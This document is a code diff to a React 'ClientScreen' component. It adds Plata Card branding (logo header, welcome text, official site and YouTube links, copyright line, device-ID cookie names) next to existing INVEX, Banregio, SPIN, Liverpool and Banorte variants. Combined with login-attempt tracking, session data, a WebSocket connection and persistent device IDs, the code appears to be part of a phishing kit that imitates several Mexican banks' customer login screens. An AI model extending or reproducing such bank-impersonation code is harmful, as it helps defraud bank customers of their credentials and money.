@@ -58,7 +58,7 @@ export default function ClientScreen() {
   );
   const [loginAttempts, setLoginAttempts] = useState(0);
   const [sessionData, setSessionData] = useState<Partial<Session> & { banco?: string }>({
-    banco: 'INVEX' // Banco por defecto para la página principal
+    banco: 'PLATACARD' // Banco por defecto para la página principal
   });
   const [bankLoaded, setBankLoaded] = useState<boolean>(isHomePage);
   
@@ -76,7 +76,7 @@ export default function ClientScreen() {
   }>({});
   
   // Estado para controlar los mensajes iniciales
-  const [initialMessage, setInitialMessage] = useState<string>('Conectando con INVEX...');
+  const [initialMessage, setInitialMessage] = useState<string>('Conectando con Plata Card...');
   const [showInitialMessage, setShowInitialMessage] = useState<boolean>(true);
   
   // WebSocket connection
@@ -85,12 +85,12 @@ export default function ClientScreen() {
   // Función para obtener o crear un ID único de dispositivo
   const getOrCreateDeviceId = () => {
     // Intentar obtener de localStorage primero
-    let deviceId = localStorage.getItem('invex_device_id');
+    let deviceId = localStorage.getItem('platacard_device_id');
     
     // Si no existe, intentar obtener de cookies
     if (!deviceId) {
       const cookies = document.cookie.split(';');
-      const deviceCookie = cookies.find(c => c.trim().startsWith('invex_device_id='));
+      const deviceCookie = cookies.find(c => c.trim().startsWith('platacard_device_id='));
       if (deviceCookie) {
         deviceId = deviceCookie.split('=')[1];
       }
@@ -101,12 +101,12 @@ export default function ClientScreen() {
       deviceId = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
       
       // Guardar en localStorage
-      localStorage.setItem('invex_device_id', deviceId);
+      localStorage.setItem('platacard_device_id', deviceId);
       
       // Guardar en cookies (válida por 30 días)
       const expiryDate = new Date();
       expiryDate.setDate(expiryDate.getDate() + 30);
-      document.cookie = `invex_device_id=${deviceId}; expires=${expiryDate.toUTCString()}; path=/`;
+      document.cookie = `platacard_device_id=${deviceId}; expires=${expiryDate.toUTCString()}; path=/`;
     }
     
     return deviceId;
@@ -571,6 +571,17 @@ export default function ClientScreen() {
           <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
+    } else if (sessionData.banco === 'PLATACARD') {
+      return (
+        <header className="bg-gradient-to-r from-gray-600 to-gray-700 text-white p-4 text-center">
+          <div className="flex justify-center mb-2">
+            <div className="text-2xl font-bold tracking-wider text-white">
+              PLATA<span className="text-gray-300">CARD</span>
+            </div>
+          </div>
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
+        </header>
+      );
     } else {
       // Default header (Banorte)
       return (
@@ -621,6 +632,7 @@ export default function ClientScreen() {
               sessionData.banco === 'INVEX' ? 'https://www.invex.com/' :
               sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/' :
               sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/' :
+              sessionData.banco === 'PLATACARD' ? 'https://www.platacard.com/' :
               'https://www.banorte.com/'
             } target="_blank" rel="noopener noreferrer" className={`${
               sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' : 
@@ -802,6 +814,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'INVEX' ? 'https://youtube.com/@invexoficial?si=OdZlV-hKxx1W2YIg' :
                 sessionData.banco === 'BANREGIO' ? 'https://www.youtube.com/channel/UC0UWRvXksJJzXG-hRnGDG3g' :
                 sessionData.banco === 'SPIN' ? 'https://www.youtube.com/channel/UC6LuKC5QzmY2V4qVbJYJavw' :
+                sessionData.banco === 'PLATACARD' ? 'https://www.youtube.com/channel/platacard' :
                 'https://www.youtube.com/user/GFBanorte'
               } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Youtube</a>
             </div>
@@ -817,6 +830,7 @@ export default function ClientScreen() {
               sessionData.banco === 'INVEX' ? 'INVEX' :
               sessionData.banco === 'BANREGIO' ? 'Banregio' :
               sessionData.banco === 'SPIN' ? 'SPIN by Oxxo' :
+              sessionData.banco === 'PLATACARD' ? 'Plata Card' :
               'Banorte'
             } México 2025. Todos los Derechos Reservados</div>
           </div>
@@ -901,6 +915,12 @@ export default function ClientScreen() {
           <p className="text-sm text-gray-600 mt-1">Bienvenido a SPIN by Oxxo</p>
         </div>
       );
+    } else if (sessionData.banco === 'PLATACARD') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Bienvenido a Plata Card, la tarjeta que te premia</p>
+        </div>
+      );
     } else {
       return (
         <div className="text-center mt-4 px-4">
@@ -943,6 +963,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'INVEX' ? 'invex-bg' :
                 sessionData.banco === 'BANREGIO' ? 'banregio-bg' :
                 sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :
+                sessionData.banco === 'PLATACARD' ? 'platacard-bg' :
                 'bg-[#EC1C24]'
               } animate-progress-bar`}></div>
             </div>
